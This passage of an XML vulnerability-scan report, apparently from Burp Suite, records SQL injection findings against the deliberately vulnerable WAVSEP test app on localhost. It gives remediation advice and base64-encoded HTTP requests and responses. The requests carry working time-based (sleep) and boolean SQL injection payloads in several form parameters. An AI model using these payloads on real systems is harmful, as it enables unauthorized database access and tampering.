QjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbXNnSWQ9KHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEp]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQxOjQ1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NTgNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNyAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2608320671080858624</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case08-InjectionInCalc-Numeric-BooleanExploit-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case08-InjectionInCalc-Numeric-BooleanExploit-WithDifferent200Responses.jsp [minBalanace parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>minBalanace</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>34951570 or 3632=03632</b> and <b>94519497 or 1808=1812</b> were each submitted in the minBalanace parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the minBalanace parameter. The application took <b>20003</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDgtSW5qZWN0aW9uSW5DYWxjLU51bWVyaWMtQm9vbGVhbkV4cGxvaXQtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDE3DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDgtSW5qZWN0aW9uSW5DYWxjLU51bWVyaWMtQm9vbGVhbkV4cGxvaXQtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1pbkJhbGFuYWNlPTEwMDAwMzQ5NTE1NzAlMjBvciUyMDM2MzIlM2QwMzYzMg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQyOjQ2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNjkNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgOCAtIEluamVjdGlvbiBpbnRvIG51bWVyaWMgdmFsdWVzIGluIGEgY2FsY3VsYXRpb24gcGFnZSB3aXRoIGRpZmZlcmVudCB2YWxpZCByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKU2V2ZXJhbCBhY2NvdW50cyBtYXRjaCB0aGUgY3JpdGVyaWEuCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDgtSW5qZWN0aW9uSW5DYWxjLU51bWVyaWMtQm9vbGVhbkV4cGxvaXQtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDE3DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDgtSW5qZWN0aW9uSW5DYWxjLU51bWVyaWMtQm9vbGVhbkV4cGxvaXQtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1pbkJhbGFuYWNlPTEwMDAwOTQ1MTk0OTclMjBvciUyMDE4MDglM2QxODEy]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQyOjQ2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNDINCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgOCAtIEluamVjdGlvbiBpbnRvIG51bWVyaWMgdmFsdWVzIGluIGEgY2FsY3VsYXRpb24gcGFnZSB3aXRoIGRpZmZlcmVudCB2YWxpZCByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKTm8gTWF0Y2guCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDgtSW5qZWN0aW9uSW5DYWxjLU51bWVyaWMtQm9vbGVhbkV4cGxvaXQtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDE3DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDgtSW5qZWN0aW9uSW5DYWxjLU51bWVyaWMtQm9vbGVhbkV4cGxvaXQtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1pbkJhbGFuYWNlPShzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKQ==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQxOjQ1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNjkNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgOCAtIEluamVjdGlvbiBpbnRvIG51bWVyaWMgdmFsdWVzIGluIGEgY2FsY3VsYXRpb24gcGFnZSB3aXRoIGRpZmZlcmVudCB2YWxpZCByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKU2V2ZXJhbCBhY2NvdW50cyBtYXRjaCB0aGUgY3JpdGVyaWEuCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7598539713079606272</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case09-InjectionInUpdate-Numeric-CommandInjection-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case09-InjectionInUpdate-Numeric-CommandInjection-WithDifferent200Responses.jsp [msgid parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msgid</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the msgid parameter. The application took <b>20003</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDktSW5qZWN0aW9uSW5VcGRhdGUtTnVtZXJpYy1Db21tYW5kSW5qZWN0aW9uLVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiA3DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDktSW5qZWN0aW9uSW5VcGRhdGUtTnVtZXJpYy1Db21tYW5kSW5qZWN0aW9uLVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQptc2dpZD0oc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSk=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQxOjQ1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNDQNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDkgLSBJbmplY3Rpb24gaW50byBudW1lcmljIHZhbHVlcyBpbiBhbiB1cGRhdGUgcGFnZSB3aXRoIGRpZmZlcmVudCB2YWxpZCByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKUXVlcnkgZXhlY3V0ZWQKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8939526183841383424</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp [orderby parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>orderby</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the orderby parameter. The application took <b>20020</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
